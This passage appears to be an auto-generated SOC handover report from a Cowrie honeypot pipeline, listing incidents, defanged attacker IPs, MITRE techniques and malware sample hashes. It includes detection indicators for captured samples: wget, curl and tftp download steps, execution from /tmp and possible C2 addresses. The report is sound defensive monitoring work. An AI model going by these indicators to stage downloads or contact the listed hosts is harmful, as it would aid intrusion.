| **Last Seen** | 2026-07-05 12:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 12:43:05` | `cowrie.session.connect` |
| `2026-07-05 12:43:05` | `cowrie.client.version` |
| `2026-07-05 12:43:05` | `cowrie.client.kex` |
| `2026-07-05 12:43:05` | `cowrie.login.success` |
| `2026-07-05 12:43:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.75.141[.]245` to AbuseIPDB if not already reported
- [ ] Block `51.75.141[.]245` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-980cd0c8f5a5

| Field | Detail |
|---|---|
| **Source IP** | `51.75.141[.]245` |
| **First Seen** | 2026-07-05 12:43 |
| **Last Seen** | 2026-07-05 12:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 12:43:05` | `cowrie.session.connect` |
| `2026-07-05 12:43:05` | `cowrie.client.version` |
| `2026-07-05 12:43:05` | `cowrie.client.kex` |
| `2026-07-05 12:43:06` | `cowrie.login.success` |
| `2026-07-05 12:43:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.75.141[.]245` to AbuseIPDB if not already reported
- [ ] Block `51.75.141[.]245` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4509afd3a42c

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-05 12:45 |
| **Last Seen** | 2026-07-05 12:45 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 12:45:44` | `cowrie.session.connect` |
| `2026-07-05 12:45:47` | `cowrie.client.version` |
| `2026-07-05 12:45:47` | `cowrie.client.kex` |
| `2026-07-05 12:45:52` | `cowrie.login.success` |
| `2026-07-05 12:45:56` | `cowrie.session.params` |
| `2026-07-05 12:45:56` | `cowrie.command.input` |
| `2026-07-05 12:45:57` | `cowrie.log.closed` |
| `2026-07-05 12:45:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `164.92.115[.]22` | **455** | 2026-07-05 08:55 | 2026-07-05 12:54 | 292m | 0 | `T1592` | 🟠 MEDIUM |
| `206.81.2[.]201` | **181** | 2026-07-05 08:55 | 2026-07-05 12:54 | 108m | 0 | `T1592` | 🟠 MEDIUM |
| `179.61.192[.]156` | **125** | 2026-07-05 08:55 | 2026-07-05 12:53 | 137m | 0 | `T1592` | 🟠 MEDIUM |
| `205.186.144[.]66` | **4** | 2026-07-05 12:37 | 2026-07-05 12:48 | 2m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]228` | **3** | 2026-07-05 10:31 | 2026-07-05 11:15 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `103.242.104[.]81` | **2** | 2026-07-05 09:20 | 2026-07-05 10:46 | 1m | 0 | `T1592` | 🟢 LOW |
| `172.202.118[.]11` | **2** | 2026-07-05 10:35 | 2026-07-05 10:35 | 0m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]137` | **2** | 2026-07-05 12:42 | 2026-07-05 12:42 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.80.88[.]32` | **2** | 2026-07-05 11:59 | 2026-07-05 11:59 | 0m | 0 | `T1592` | 🟢 LOW |
| `58.222.86[.]210` | **2** | 2026-07-05 10:03 | 2026-07-05 10:05 | 2m | 0 | `T1592` | 🟢 LOW |
| `102.220.160[.]39` | 1 | 2026-07-05 09:40 | 2026-07-05 09:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `107.150.146[.]69` | 1 | 2026-07-05 10:31 | 2026-07-05 10:31 | 1s | 0 | `T1592` | 🟢 LOW |
| `115.190.126[.]161` | 1 | 2026-07-05 12:39 | 2026-07-05 12:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `115.227.26[.]85` | 1 | 2026-07-05 11:02 | 2026-07-05 11:03 | 30s | 0 | `T1592` | 🟢 LOW |
| `116.255.169[.]129` | 1 | 2026-07-05 12:01 | 2026-07-05 12:03 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.193.9[.]168` | 1 | 2026-07-05 09:35 | 2026-07-05 09:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `14.103.112[.]116` | 1 | 2026-07-05 11:19 | 2026-07-05 11:21 | 120s | 0 | `T1592` | 🟢 LOW |
| `141.11.88[.]137` | 1 | 2026-07-05 11:34 | 2026-07-05 11:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `210.16.100[.]120` | 1 | 2026-07-05 10:24 | 2026-07-05 10:25 | 46s | 0 | `T1592` | 🟢 LOW |
| `212.8.242[.]38` | 1 | 2026-07-05 10:22 | 2026-07-05 10:22 | 49s | 0 | `T1592` | 🟢 LOW |
| `45.134.225[.]16` | 1 | 2026-07-05 10:24 | 2026-07-05 10:24 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.8[.]221` | 1 | 2026-07-05 09:32 | 2026-07-05 09:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `62.60.130[.]219` | 1 | 2026-07-05 10:05 | 2026-07-05 10:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]104` | 1 | 2026-07-05 09:09 | 2026-07-05 09:09 | 19s | 0 | `T1592` | 🟢 LOW |
| `67.220.180[.]114` | 1 | 2026-07-05 09:15 | 2026-07-05 09:16 | 41s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]16` | 1 | 2026-07-05 09:13 | 2026-07-05 09:13 | 0s | 0 | `T1592` | 🟢 LOW |
| `81.56.96[.]82` | 1 | 2026-07-05 12:39 | 2026-07-05 12:40 | 30s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]42` | 1 | 2026-07-05 12:00 | 2026-07-05 12:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]53` | 1 | 2026-07-05 09:09 | 2026-07-05 09:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]74` | 1 | 2026-07-05 12:15 | 2026-07-05 12:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.92.40[.]6` | 1 | 2026-07-05 09:04 | 2026-07-05 09:04 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 68/100 | 🟡 MEDIUM | **22/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 50/100 | 🟡 MEDIUM | **25/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 85/100 | 🔴 HIGH | **38/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 51/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 52/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 53/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 64/100 | 🟡 MEDIUM | **12/74** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 64/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 85/100 | 🔴 HIGH | **38/74** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 61/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 46/100 | 🟡 MEDIUM | **40/73** 🔴 |
| `7b61a0032297d2b400d3dd5e69556a8ca31adb717464c247aaf997f4b4de26f6` | Unknown binary | `7b61a0032297d2b4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `80e404f6a1b7c29380ce6a82ed5379e81b3bd50f9ddfde1ab6a849d30959a3d4` | ELF Binary (Linux executable) (unknown (e_machine=0x14) 32-bit) | `80e404f6a1b7c293...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `84fac1d9c9d83182fa6428365907f7fbeb4c621eb7eb2b2a0140fdcd245b20e9` | ELF Binary (Linux executable) (x86-64 64-bit) | `84fac1d9c9d83182...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` | ELF Binary (Linux executable) (x86-64 64-bit) | `88d028a54a136782...` | 87/100 | 🔴 HIGH | **43/74** 🔴 |
| `8e7395ed4110a27c717f63cd7e039b19939c87c9283710108ebc38946f4fbf98` | Shell Script | `8e7395ed4110a27c...` | 62/100 | 🟡 MEDIUM | **6/75** 🔴 |
| `938d5d3054da170715410084aef8fc7d029a4adf6e622b4245619ec0cc3bddf2` | ELF Binary (Linux executable) (MIPS 32-bit) | `938d5d3054da1707...` | 52/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `93e71b122a432c2b7acf6a5db6ee3e42e792ef240acee466c4310b052e2416db` | Shell Script | `93e71b122a432c2b...` | 62/100 | 🟡 MEDIUM | **31/73** 🔴 |
| `9646ec7df450cf35e898623f8eb1dd3fe66569730156d0bb055d04ebb5272afc` | Unknown binary | `9646ec7df450cf35...` | 55/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `97a1e6f817d44a4f8b07fdebaf9357786742096c470eb5d78e789b6bb53979bb` | ELF Binary (Linux executable) (x86-64 64-bit) | `97a1e6f817d44a4f...` | 42/100 | 🟡 MEDIUM | **30/73** 🔴 |
| `a2f3d6d2bd82a65939f4e939bce242e8e246014fb3a9a9d5c3769ed7dcfffe24` | Unknown binary | `a2f3d6d2bd82a659...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a6fbbdec757b0fe91ea18dc3d9f7b379c18ca49eeef63afaea8da3c9385b1049` | ELF Binary (Linux executable) (x86-64 64-bit) | `a6fbbdec757b0fe9...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/74** 🔴 |
| `b1633346a694467b99d9596fe36d0cc88ff1f82f8e86f1c53d3218de1839a43e` | Python Script | `b1633346a694467b...` | 62/100 | 🟡 MEDIUM | **7/75** 🔴 |
| `b1e4374da060cb4bf9ff872f3e060486d9cd400519e0b2823f61670d64148ab4` | ELF Binary (Linux executable) (x86-64 64-bit) | `b1e4374da060cb4b...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` (88d028a54a136782982817d1...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `81.56.96[.]82` | IT | Iliad / Free SAS | **100** ⚠️ | 50 |
| `116.255.169[.]129` | CN | Zhengzhou Gainet Computer Network Technology Co.,Ltd. | **100** ⚠️ | 9 |
| `140.245.50[.]204` | SG | Oracle Corporation | **100** ⚠️ | 1 |
| `141.11.88[.]137` | US | Vantiva SA | **100** ⚠️ | 3 |
| `210.16.100[.]120` | US | Psychz Networks | **100** ⚠️ | 7 |
| `47.80.29[.]108` | KR | Alibaba Cloud LLC | **100** ⚠️ | 19 |
| `175.103.54[.]172` | ID | Maxindo Content Solution, PT | **100** ⚠️ | 3 |
| `205.186.144[.]66` | US | GoDaddy.com, LLC | **100** ⚠️ | 10 |
| `129.153.145[.]135` | US | Oracle Corporation | **100** ⚠️ | 8 |
| `20.80.88[.]32` | US | Microsoft Corporation | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 175 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 160 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 69 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 15 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 13 |

---

## 🔕 False Positive Summary (22 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 13 below threshold 25 | 1 |
| AbuseIPDB score 14 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 3 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 14 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 980 cases |
| Tool 34  | Credential Extractor        | ✅ 182 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 16 fingerprints |
| Tool 36  | Command Clustering          | ✅ 8 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 68 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 22 filtered (2.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 51 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 36 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 159 priority case(s) shown individually · 31 recon entry/entries in table (10 group(s) consolidating 778 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-05T13:49:25Z_
